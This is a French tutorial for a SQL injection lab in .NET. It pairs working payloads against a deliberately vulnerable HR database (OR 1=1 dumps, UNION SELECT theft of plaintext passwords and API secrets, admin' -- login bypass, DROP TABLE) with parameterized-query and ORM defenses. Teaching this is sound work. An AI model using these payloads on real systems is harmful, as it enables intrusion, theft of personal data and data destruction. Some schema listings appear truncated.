SQL Injection

Exploitation d'une base de donnees personnelles via injection SQL en .NET

Avertissement legal Ce labo est strictement educatif. L'injection SQL sur des systemes sans autorisation est un delit (acces frauduleux a un systeme d'information).

L'injection SQL (SQLi) est une vulnerabilite qui permet a un attaquant de manipuler les requetes SQL executees par une application, en injectant du code SQL via les champs de saisie. C'est la vulnerabilite n°3 du OWASP Top 10 (Injection).

Consequences possibles : vol de donnees, modification ou suppression de la base, bypass d'authentification, execution de commandes systeme, acces complet au serveur.

Principe fondamental

L'injection SQL exploite le melange entre code SQL et donnees utilisateur dans une meme chaine :

// Code C# vulnerable :
var sql = $"SELECT * FROM Users WHERE Name = '{userInput}'";

Si l'utilisateur entre Jean, la requete est normale :

SELECT * FROM Users WHERE Name = 'Jean'

Mais s'il entre ' OR '1'='1, il modifie la structure de la requete :

SELECT * FROM Users WHERE Name = '' OR '1'='1'
-- Equivalent a : SELECT * FROM Users WHERE (Name = '') OR ('1'='1')
-- '1'='1' est TOUJOURS vrai : retourne TOUT !
Le probleme Le moteur SQL ne fait aucune difference entre le code ecrit par le developpeur et le code injecte par l'utilisateur. Pour lui, c'est une seule chaine SQL a executer.

Types d'injection SQL

TypeTechniqueDetection
In-band (classique) Le resultat de l'injection est visible directement dans la reponse FACILE
UNION-based Utilise UNION SELECT pour extraire des donnees d'autres tables FACILE
Error-based Exploite les messages d'erreur SQL pour extraire des informations FACILE
Blind (boolean) La reponse change (contenu different) selon que la condition injectee est vraie ou fausse DIFFICILE
Blind (time-based) Utilise SLEEP() ou WAITFOR pour mesurer le temps de reponse DIFFICILE
Out-of-band Exfiltration via DNS ou HTTP (ex: xp_cmdshell, LOAD_FILE) TRES DIFFICILE
Dans ce labo Nous couvrons les types in-band et UNION-based, les plus courants et pedagogiques.

La base de donnees du labo

Le labo utilise une base SQLite en memoire avec 3 tables simulant un systeme RH :

CREATE TABLE Persons (

    NationalId TEXT,       -- Numero de registre national
    DateOfBirth TEXT,
    CreditCard TEXT,       -- Numero de carte de credit
    Iban TEXT,              -- Compte bancaire
    Salary REAL,            -- Salaire
    Department TEXT
);

Table Users (4 comptes)

CREATE TABLE Users (
    Id INTEGER PRIMARY KEY,
    Username TEXT,
    Password TEXT,          -- En clair ! (volontairement vulnerable)
    Role TEXT,              -- admin, user, manager
    Email TEXT
);

Table SecretConfig (secrets de l'application)

CREATE TABLE SecretConfig (
    Key TEXT PRIMARY KEY,
    Value TEXT              -- Connection strings, cles API, JWT secrets...

Attaque 1 : Dump de toutes les donnees

Objectif

Recuperer tous les enregistrements au lieu d'un seul.

Payload

' OR '1'='1

Decomposition

-- Requete prevue par le developpeur :
SELECT * FROM Persons WHERE LastName LIKE '%Dupont%'

-- Requete avec l'injection :
SELECT * FROM Persons WHERE LastName LIKE '%' OR '1'='1%'

-- Le moteur SQL evalue :
-- (LastName LIKE '%')  => chaine vide, matche rien
-- OR ('1'='1%')       => TOUJOURS VRAI
-- Resultat : toutes les lignes sont retournees !
Impact L'attaquant recoit les 10 enregistrements avec nom, email, telephone, adresse, numero national, carte de credit, IBAN et salaire de tous les employes.

Attaque 2 : UNION SELECT (extraction cross-table)

Objectif

Extraire des donnees d'une autre table (Users, SecretConfig).

Payload : voler les mots de passe

' UNION SELECT 1,Username,Password,Email,Role,'','','','','','',0,'' FROM Users --

Decomposition

-- Requete resultante :
SELECT * FROM Persons WHERE LastName LIKE '%'
UNION SELECT 1,Username,Password,Email,Role,'','','','','','',0,''
FROM Users --%'

-- Le -- commente le reste de la requete originale
-- UNION combine les resultats des deux SELECT
-- Les colonnes doivent correspondre (13 colonnes dans Persons)

Payload : voler les secrets de config

' UNION SELECT 1,Key,Value,'','','','','','','','',0,'' FROM SecretConfig --
Impact L'attaquant recupere les mots de passe en clair, les cles API, les connection strings de production, les secrets JWT... C'est un acces total au systeme.
Condition pour UNION Le nombre de colonnes du UNION SELECT doit correspondre au nombre de colonnes du SELECT original. Pour trouver ce nombre, on peut tester : ' UNION SELECT 1--, ' UNION SELECT 1,2--, ' UNION SELECT 1,2,3-- ... jusqu'a ne plus avoir d'erreur.

Attaque 3 : Bypass d'authentification

Objectif

Se connecter sans connaitre le mot de passe.

Payload dans le champ username

admin' --

Decomposition

-- Requete prevue :
SELECT * FROM Users WHERE Username = 'admin' AND Password = 'motdepasse'

-- Requete avec injection dans username :
SELECT * FROM Users WHERE Username = 'admin' --' AND Password = 'nimportequoi'

-- Ce que le moteur SQL execute :
SELECT * FROM Users WHERE Username = 'admin' -- tout le reste est un commentaire
-- Le mot de passe n'est JAMAIS verifie !

Variante : se connecter comme n'importe qui

// Dans le champ username :
' OR '1'='1' --

// Resultat : le WHERE est toujours vrai
// Retourne le PREMIER utilisateur de la table (souvent l'admin)

Attaque 4 : DROP TABLE (destruction)

Payload

'; DROP TABLE Persons; --

Decomposition

-- Requete resultante :
SELECT * FROM Persons WHERE LastName LIKE '%';
DROP TABLE Persons;
--%'

-- Le ; termine la premiere requete
-- DROP TABLE Persons supprime TOUTE la table
-- -- commente le reste
Impact La table Persons est supprimee definitivement avec toutes ses donnees. Dans le labo, utilisez le bouton "Reset BDD" dans la console SQL pour la restaurer. En production, c'est souvent irreversible sans backup.
Note SQLite SQLite ne supporte pas l'execution de requetes multiples par defaut dans un seul ExecuteReader(). Ce payload peut echouer dans notre labo mais fonctionne sur SQL Server, MySQL et PostgreSQL avec les drivers standards.

Code vulnerable vs securise

VULNERABLE : string concatenation

// L'input est injecte dans la chaine SQL
var sql = $"SELECT * FROM Persons
  WHERE LastName LIKE '%{searchTerm}%'";

cmd.CommandText = sql;
cmd.ExecuteReader();

Le moteur SQL ne distingue pas le code du developpeur de l'input utilisateur.

SECURISE : requetes parametrees

// L'input est passe comme parametre separe
var sql = "SELECT * FROM Persons
  WHERE LastName LIKE $term";

cmd.CommandText = sql;
cmd.Parameters.AddWithValue("$term",
  $"%{searchTerm}%");
cmd.ExecuteReader();

Le moteur SQL traite le parametre comme une VALEUR, jamais comme du code.

Principe fondamental Avec les requetes parametrees, la structure de la requete et les valeurs sont envoyees separement au moteur SQL. Il est donc physiquement impossible qu'une valeur modifie la structure de la requete.

ORM et Entity Framework

Les ORM (Object-Relational Mappers) comme Entity Framework utilisent des requetes parametrees par defaut :

// Entity Framework - SECURISE par defaut
var persons = context.Persons
    .Where(p => p.LastName.Contains(searchTerm))
    .ToList();

// EF genere automatiquement :
// SELECT * FROM Persons WHERE LastName LIKE @p0
// avec @p0 = '%searchTerm%' (parametre)
Attention : raw SQL dans les ORM Meme avec un ORM, on peut creer des injections SQL si on utilise du SQL brut : 
// DANGEREUX meme avec Entity Framework !
context.Persons
    .FromSqlRaw($"SELECT * FROM Persons WHERE Name = '{input}'")
    .ToList();

// SECURISE avec FromSqlInterpolated :
context.Persons
    .FromSqlInterpolated($"SELECT * FROM Persons WHERE Name = {input}")
    .ToList();

Protections contre l'injection SQL

ProtectionEfficaciteDetails
Requetes parametrees ESSENTIEL Separation code/donnees. Protection complete contre l'injection classique.
ORM (Entity Framework) ESSENTIEL Parametrise par defaut. Eviter FromSqlRaw avec des inputs utilisateur.
Stored Procedures BON Le SQL est precompile cote serveur, mais attention au SQL dynamique dans les SP.
Validation des entrees BON Whitelist de caracteres, validation du type (nombre, date...). Couche supplementaire.
Principe du moindre privilege BON Le compte SQL de l'app ne devrait pas pouvoir DROP TABLE ou acceder aux tables admin.
WAF (Web Application Firewall) INSUFFISANT Peut etre contourne avec de l'encodage, des commentaires, de l'obfuscation.
Filtrage par blacklist INSUFFISANT Bloquer SELECT, UNION, ' ? Facilement contournable.
Regle d'or Toujours utiliser des requetes parametrees ou un ORM. Il n'y a aucune raison valable de concatener des inputs utilisateur dans du SQL. C'est la seule protection qui soit a la fois simple et fiable a 100%.
